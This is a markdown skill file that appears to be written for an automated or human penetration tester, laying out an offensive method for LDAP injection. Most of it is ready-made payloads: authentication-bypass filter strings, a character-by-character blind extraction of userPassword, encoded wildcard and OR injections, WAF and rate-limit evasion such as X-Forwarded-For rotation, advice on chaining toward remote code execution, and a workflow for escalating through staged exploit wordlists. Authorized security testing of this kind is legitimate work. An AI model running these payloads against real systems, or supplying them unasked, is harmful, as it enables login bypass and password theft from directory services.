---

name: web-07-ldap-injection
sequence: web-07
category: injection
domain: web
description: "LDAP injection testing: authentication bypass via filter manipulation, blind LDAP attribute extraction, wildcard/OR injection patterns, and special-character escaping bypass. Use when testing applications using LDAP for authentication or directory lookups."
wordlist_ref: "wordlists/web/web-33-ldap-injection/"
---

# LDAP Injection — Offensive Testing Methodology

## Quick Workflow

1. Identify LDAP-backed features: login, user search, address book, group lookup
2. Inject filter-breaking characters (`*`, `)`, `(`, `|`, `&`) — if results vary, LDAPi possible
3. Bypass auth or extract attributes via blind injection

---

## Detection

### Authentication Bypass

```
*)  (uid=*))(|(uid=*
*))(|(objectclass=*)
*)(uid=*
)(cn=*
```

### Filter Confusion

```
admin)(&)
admin)(|(password=*
*)(uid=*
```

### Blind Extraction

Character-by-character (like SQL blind):

```
(&(uid=admin)(userPassword=a*))
(&(uid=admin)(userPassword=b*))
```

---

## Filter Bypass Techniques

### Wildcard & Structure Injection

```
*                              # Match any entry
*)                             # Close filter, ignore rest
*)(
(&(cn=*))                      # AND with wildcard
(|(cn=*))                      # OR with wildcard
admin*                         # Prefix wildcard
admin)(|(cn=*))                # Inject OR clause
(|(uid=*)(mail=*))             # Match any uid OR any mail
(&(uid=admin)(userPassword=*)) # Known user, match any password
```

### URL-Encoded Bypass

```
%2a                            # Encoded *
%29%28%7c%28cn%3d%2a%29%29   # Encoded ))(|(cn=*))
```

### Special Character Reference

| Character | URL Encoded | Purpose |
|-----------|-------------|---------|
| `*` | `%2a` | Wildcard — matches any character sequence |
| `(` | `%28` | Open filter group |
| `)` | `%29` | Close filter group |
| `\|` | `%7c` | OR condition in filter |
| `&` | `%26` | AND condition in filter |
| `!` | `%21` | NOT condition |
| `\` | `%5c` | Escape — nullifies next char |
| NUL | `%00` | String terminator |

---

## Tools

- **JXplorer** / **Apache Directory Studio** — LDAP browsers for manual testing
- **Burp Intruder** with LDAP filter payload set
- **nmap ldap-search** script — `nmap -p 389 --script ldap-search`

---





## Hacker Mindset

**Look for the edge cases.** Vulnerabilities live in the gap between what the developer assumed and what the framework actually does. Test every boundary: empty values, nulls, arrays, negative numbers, Unicode, very long strings.

**Blind detection always needs OOB.** If you can't see the output, set up a callback. No OOB = no confirmation.

**Chaining turns low/med into critical.** A single path traversal is medium. Path traversal + log file + admin session = RCE. Always think about what comes next.



## Chaining & Escalation

### Direct Escalation
This vulnerability can often be escalated directly. Test for RCE, data access, or privilege escalation depending on context.

### Chain with Other Skills
| Partner Vulnerability | Chain Effect |
|----------------------|--------------|
| SSRF | Use SSRF to reach internal services through this vuln |
| XSS | Stolen sessions amplify account-level findings |
| IDOR/BOLA | Find more data to exploit via authorization gaps |

### Amplification
Race conditions, parallel requests, and HTTP/2 single-packet attacks can amplify impact by 10-50x.



## OOB Detection & Blind Confirmation

### Blind Confirmation
Always set up OOB detection before testing. Use:
- **Burp Collaborator** — built into Burp Suite Pro
- **Interactsh** — OOB detection server (https://app.interactsh.com)
- **Canarytokens** for callback detection

### Timing Side-Channel
If OOB is blocked, use time-based detection:
- Inject `sleep(5)` or equivalent
- Compare response times between baseline and injected requests
- 5s+ delay = vulnerability confirmed


## Bypass Techniques

| Filter/Block | Bypass |
|-------------|--------|
| WAF block | Encoding, case variation, comment injection |
| Input sanitization | Double encoding, Unicode, null bytes |
| Rate limiting | X-Forwarded-For rotation, HTTP/2 multiplex |
| Blacklist | Alternative syntax, polyglot payloads |


## Wordlist Invocation

When testing this vulnerability, invoke the wordlist payloads manually:

**Wordlist**: `wordlists/web/web-33-ldap-injection/`

**Files**:
- `wordlists/web/web-33-ldap-injection/payloads/ldap/` — staged exploit payloads (low → med → high)

**Workflow**:
1. Start with `low` stage payloads — minimal risk probes
2. If signals detected, escalate to `med` stage
3. Use `high` only after confirmation (OOB/time-based where applicable)
4. Always establish a baseline response before running time-based payloads

**Tools**: curl, httpx, Burp Suite, or any HTTP client

## References

- OWASP LDAP Injection
- PayloadsAllTheThings LDAP Injection
- RFC 4511 — LDAP: The Protocol
